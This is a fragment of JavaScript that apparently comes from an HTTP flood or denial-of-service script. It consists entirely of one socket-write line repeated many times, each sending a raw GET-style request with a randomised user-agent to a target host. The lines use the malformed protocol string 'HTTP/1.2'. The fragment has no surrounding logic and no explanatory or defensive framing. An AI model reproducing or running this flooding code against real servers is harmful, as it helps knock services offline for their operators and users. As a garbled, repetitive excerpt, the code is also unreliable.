s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
